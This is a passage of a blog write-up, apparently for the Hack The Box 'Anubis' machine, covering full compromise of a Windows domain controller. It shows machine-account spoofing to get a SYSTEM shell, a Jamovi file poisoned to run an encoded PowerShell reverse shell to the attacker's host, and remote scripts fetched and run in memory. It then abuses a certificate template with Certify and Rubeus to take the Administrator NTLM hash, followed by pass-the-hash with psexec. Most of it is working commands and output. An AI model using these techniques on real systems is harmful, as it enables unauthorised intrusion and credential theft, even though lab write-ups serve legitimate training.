+<span class="o">[</span><span class="k">*</span><span class="o">]</span> will try to impersonat administrator
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Computer Account <span class="s2">"WIN-XN9RQWTQB0I"</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> MachineAccount <span class="s2">"WIN-XN9RQWTQB0I"</span> password <span class="o">=</span> <span class="o">!</span>C<span class="k">*</span>@LHvRRNf%
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added machine account WIN-XN9RQWTQB0I with password <span class="o">!</span>C<span class="k">*</span>@LHvRRNf%.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> WIN-XN9RQWTQB0I object <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>WIN-XN9RQWTQB0I,CN<span class="o">=</span>Computers,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> WIN-XN9RQWTQB0I sAMAccountName <span class="o">==</span> EARTH
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>EARTH.ccache
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Resting the machine account to WIN-XN9RQWTQB0I
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restored WIN-XN9RQWTQB0I sAMAccountName to original value
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using TGT from cache
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating administrator
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2self
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>administrator.ccache
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remove ccache of EARTH.windcorp.htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Rename ccache with target ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to del a computer with the name: WIN-XN9RQWTQB0I
+<span class="o">[</span>-] Delete computer WIN-XN9RQWTQB0I Failed! Maybe the current user does not have permission.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Pls make sure your choice <span class="nb">hostname </span>and the <span class="nt">-dc-ip</span> are same machine <span class="o">!!</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploiting..
+<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
+9851b59ec4a8a85d93a15d3a07732978
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;</code></pre></figure> <p>Note: You can get the hostname of the server with crackmapexec.</p> <h1 id="intended-path"> <a href="#intended-path" class="anchor-head"></a> Intended Path </h1> <p>The above POC we used was unintended path to root. The intended was to abuse ADCS and get NTLM hash of Administrator. But first, we need to get a shell in the system. So, we’ll continue from <a href="#smb">SMB</a>.</p> <p>Checking the Shared share of machine, we get two folders, software with some softwares and Documents with .omv files. So, since the Jamovi is running on server, can confirmed with installed in softwares and .omv is also Jamovi’s extension. There is exploit in Jamovi which can lead us to RCE. So, let’s change the name field in one of the files inside Analytics. Will try to request a shell.js which just gives back a reverse shell.</p> <p>Softwares,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Apr 28 11:06:06 2021
+  ..                                  D        0  Wed Apr 28 11:06:06 2021
+  Documents                           D        0  Tue Apr 27 00:09:25 2021
+  Software                            D        0  Thu Jul 22 14:14:16 2021
+
+                9034239 blocks of size 4096. 2993905 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Software<span class="se">\</span>
+smb: <span class="se">\S</span>oftware<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Thu Jul 22 14:14:16 2021
+  ..                                  D        0  Thu Jul 22 14:14:16 2021
+  7z1900-x64.exe                      N  1447178  Mon Apr 26 17:10:08 2021
+  jamovi-1.6.16.0-win64.exe           N 247215343  Mon Apr 26 17:03:30 2021
+  VNC-Viewer-6.20.529-Windows.exe      N 10559784  Mon Apr 26 17:09:53 2021
+
+                9034239 blocks of size 4096. 2993905 blocks available
+smb: <span class="se">\S</span>oftware<span class="se">\&gt;</span> </code></pre></figure> <p>OMV Files,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">smbclient <span class="se">\\\\</span>10.10.11.102<span class="se">\\</span>Shared <span class="nt">-U</span> localadmin
+Enter WORKGROUP<span class="se">\l</span>ocaladmin<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Apr 28 11:06:06 2021
+  ..                                  D        0  Wed Apr 28 11:06:06 2021
+  Documents                           D        0  Tue Apr 27 00:09:25 2021
+  Software                            D        0  Thu Jul 22 14:14:16 2021
+
+                9034239 blocks of size 4096. 2998668 blocks available
+smb: \&gt; cd Documents\
+ls
+smb: \Documents\&gt; ls
+  .                                   D        0  Tue Apr 27 00:09:25 2021
+  ..                                  D        0  Tue Apr 27 00:09:25 2021
+  Analytics                           D        0  Tue Apr 27 14:40:20 2021
+
+                9034239 blocks of size 4096. 2998668 blocks available
+smb: \Documents\&gt; cd Analytics\
+smb: \Documents\Analytics\&gt; ls
+  .                                   D        0  Tue Apr 27 14:40:20 2021
+  ..                                  D        0  Tue Apr 27 14:40:20 2021
+  Big 5.omv                           A     6455  Tue Apr 27 14:39:20 2021
+  Bugs.omv                            A     2897  Tue Apr 27 14:39:55 2021
+  Tooth Growth.omv                    A     2142  Tue Apr 27 14:40:20 2021
+  Whatif.omv                          A     2841  Sat Jan 29 23:41:40 2022
+
+                9034239 blocks of size 4096. 2998668 blocks available
+smb: \Documents\Analytics\&gt; get Whatif.omv 
+getting file \Documents\Analytics\Whatif.omv of size 2841 as Whatif.omv (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
+smb: \Documents\Analytics\&gt; </span></code></pre></figure> <figure> <img src="/assets/img/anubis/meta.png" alt="metdata" /> <figcaption> XSS </figcaption> </figure> <p>zexion.js,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% <span class="nb">cat </span>zexion.js 
+const <span class="nb">exec</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.exec<span class="p">;</span>  
+<span class="nb">exec</span><span class="o">(</span><span class="s1">'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA0ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA='</span><span class="o">)</span><span class="p">;</span>
+% smbclient <span class="se">\\\\</span>10.10.11.102<span class="se">\\</span>Shared <span class="nt">-U</span> localadmin
+Enter WORKGROUP<span class="se">\l</span>ocaladmin<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; cd Documents\Analytics\
+smb: \Documents\Analytics\&gt; ls
+  .                                   D        0  Tue Apr 27 14:40:20 2021
+  ..                                  D        0  Tue Apr 27 14:40:20 2021
+  Big 5.omv                           A     6455  Tue Apr 27 14:39:20 2021
+  Bugs.omv                            A     2897  Tue Apr 27 14:39:55 2021
+  Tooth Growth.omv                    A     2142  Tue Apr 27 14:40:20 2021
+  Whatif.omv                          A     2841  Sat Jan 29 23:56:41 2022
+
+                9034239 blocks of size 4096. 2984285 blocks available
+smb: \Documents\Analytics\&gt; put Whatif.omv 
+putting file Whatif.omv as \Documents\Analytics\Whatif.omv (3.1 kb/s) (average 3.1 kb/s)
+smb: \Documents\Analytics\&gt; put Whatif.omv 
+putting file Whatif.omv as \Documents\Analytics\Whatif.omv (3.1 kb/s) (average 3.1 kb/s)
+smb: \Documents\Analytics\&gt; </span></code></pre></figure> <p>And we get a shell back as diegocruz,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% rlwrap nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.14.54] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 59672
+<span class="nb">whoami
+</span>windcorp<span class="se">\d</span>iegocruz
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; </code></pre></figure> <p>Now, we can pretty get idea from this <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noopener nofollow">blog</a> and improve some steps now. When checking the shares, we saw that Certenroll. So, we can pretty much guess the root path is ADCS Abuse. Let’s download <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe" target="_blank" rel="noopener nofollow">Certify.exe</a>, <a href="https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1" target="_blank" rel="noopener nofollow">ADCS.ps1</a>, <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener nofollow">Powerview.ps1</a> and <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" target="_blank" rel="noopener nofollow">Rubeus.exe</a>. But the ADCS doesn’t work because the UserPrincipalName in box is wrong. It is using .thm as its domain. So, we’ll get errored out. So, let’s just change it to be SamAccountName and then import.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; Get-ADUser diegocruz
+
+
+DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Diego Cruz,OU<span class="o">=</span>MainOffice,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
+Enabled           : True
+GivenName         : Diego
+Name              : Diego Cruz
+ObjectClass       : user
+ObjectGUID        : e085c2ea-a376-42bf-8ea5-4fdd2dadc3b1
+SamAccountName    : DiegoCruz
+SID               : S-1-5-21-3510634497-171945951-3071966075-3245
+Surname           : Cruz
+UserPrincipalName : Diego.Cruz@windcorp.thm
+ </code></pre></figure> <figure> <img src="/assets/img/anubis/fix.png" alt="Fixed" /> <figcaption> Quick Fix </figcaption> </figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; wget 10.10.14.54/ADCS.ps1 | IEX
+
+&lt;<span class="c">#</span>
+.SYNOPSIS
+
+Just a shortcut to PowerViews Get-DomainObject that retrieves Root CAs from the default location at <span class="nv">CN</span><span class="o">=</span>Certification
+Authorities,CN<span class="o">=</span>Public Key Services,CN<span class="o">=</span>Services,CN<span class="o">=</span>Configuration....
+
+Author: Christoph Falta <span class="o">(</span>@cfalta<span class="o">)</span>
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+<span class="c">#&gt;</span>
+    <span class="nv">$DomainName</span> <span class="o">=</span> <span class="s2">"DC="</span> + <span class="o">(((</span>Get-Domain<span class="o">)</span>.Name<span class="o">)</span>.Replace<span class="o">(</span><span class="s2">"."</span>,<span class="s2">",DC="</span><span class="o">))</span>
+    <span class="nv">$BasePath</span> <span class="o">=</span> <span class="s2">"CN=Public Key Services,CN=Services,CN=Configuration"</span> + <span class="s2">","</span> + <span class="nv">$DomainName</span>
+    <span class="nv">$RootCA</span> <span class="o">=</span>  Get-DomainObject <span class="nt">-SearchBase</span> <span class="o">(</span><span class="s2">"CN=Certification Authorities,"</span> + <span class="nv">$BasePath</span><span class="o">)</span> <span class="nt">-LDAPFilter</span>
+<span class="s2">"(objectclass=certificationAuthority)"</span>
+    <span class="nv">$RootCA</span>
+
+PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; wget 10.10.14.54/PowerView.ps1 | IEX
+PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; wget 10.10.14.54/Certify.exe <span class="nt">-O</span> Certify.exe
+PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; wget 10.10.14.54/Rubeus.exe <span class="nt">-O</span> Rubeus.exe
+PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt;</code></pre></figure> <p>We find the template name as Web with Certify,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; .<span class="se">\C</span>ertify.exe find
+.<span class="se">\C</span>ertify.exe find /authclient
+
+   _____          _   _  __
+  / ____|        | | <span class="o">(</span>_<span class="o">)</span>/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ <span class="se">\ </span><span class="s1">'__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base '</span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb<span class="s1">'
+
+[*] Listing info about the Enterprise CA '</span>windcorp-CA<span class="s1">'
+
+    Enterprise CA Name            : windcorp-CA
+    DNS Hostname                  : earth.windcorp.htb
+    FullName                      : earth.windcorp.htb\windcorp-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=windcorp-CA, DC=windcorp, DC=htb
+    Cert Thumbprint               : 280458EB20AE6B8A8FFE9B428A5078094F91B3E8
+    Cert Serial                   : 3645930A75C5C8BA4AAC0A5C883DEE60
+    Cert Start Date               : 5/24/2021 7:48:07 PM
+    Cert End Date                 : 5/24/2036 7:58:07 PM
+    Cert Chain                    : CN=windcorp-CA,DC=windcorp,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+[---------- SNIP ----------]
+    CA Name                               : earth.windcorp.htb\windcorp-CA
+    Template Name                         : Web
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : Server Authentication
+    Permissions
+                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+
+
+
+Certify completed in 00:00:13.6025779
+PS C:\users\diegocruz\desktop&gt;</span></code></pre></figure> <p>And we get NTLM Hash of Administrator,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; Get-SmartCardCertificate <span class="nt">-Identity</span> Administrator <span class="nt">-TemplateName</span> Web <span class="nt">-NoSmartCard</span>
+PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; Get-ChildItem cert:<span class="se">\c</span>urrentuser<span class="se">\m</span>y <span class="nt">-recurse</span>
+
+
+   PSParentPath: Microsoft.PowerShell.Security<span class="se">\C</span>ertificate::currentuser<span class="se">\m</span>y
+
+Thumbprint                                Subject
+<span class="nt">----------</span>                                <span class="nt">-------</span>
+D88FCB374AAB94FE2C23DDAC11ECA01D704C755E
+
+
+PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; .<span class="se">\R</span>ubeus.exe asktgt /user:Administrator /getcredentials /certificate:D88FCB374AAB94FE2C23DDAC11ECA01D704C755E
+
+   ______        _
+  <span class="o">(</span>_____ <span class="se">\ </span>     | |
+   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
+  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
+  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/
+
+  v2.0.0
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Ask TGT
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using PKINIT with etype rc4_hmac and subject:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ PKINIT preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">'windcorp.htb\Administrator'</span>
+<span class="o">[</span>+] TGT request successful!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">base64</span><span class="o">(</span>ticket.kirbi<span class="o">)</span>:
+
+      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
+      <span class="nv">MzYxN1qoDhsMV0lORENPUlAuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0Gwx3aW5kY29ycC5odGI</span><span class="o">=</span>
+
+  ServiceName              :  krbtgt/windcorp.htb
+  ServiceRealm             :  WINDCORP.HTB
+  UserName                 :  Administrator
+  UserRealm                :  WINDCORP.HTB
+  StartTime                :  1/30/2022 6:36:17 AM
+  EndTime                  :  1/30/2022 4:36:17 PM
+  RenewTill                :  2/6/2022 6:36:17 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64<span class="o">(</span>key<span class="o">)</span>              :  h8lT6mm+8biEseKQnvfSWg<span class="o">==</span>
+  ASREP <span class="o">(</span>key<span class="o">)</span>              :  F46E003D8C09E9ECF26C3AC295346D9D
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 3CCC18280610C6CA3156F995B5899E09
+PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt;</code></pre></figure> <p>And we finally have a shell as Administrator with intended path,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">psexec.py administrator@10.10.11.102 <span class="nt">-hashes</span> 3CCC18280610C6CA3156F995B5899E09:3CCC18280610C6CA3156F995B5899E09
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.11.102.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file floFnERu.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.11.102.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Yrwk on 10.10.11.102.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Yrwk.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.2114]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cat</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
+<span class="s1">'cat'</span> is not recognized as an internal or external <span class="nb">command</span>,
+operable program or batch file.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
+9851b59ec4a8a85d93a15d3a07732978
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; </code></pre></figure> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-next" href="/Forge/"> <div class="nav-arrow">Next</div> <span class="post-title">Forge - Hack The Box</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/thanks">ack.</a> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2022</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
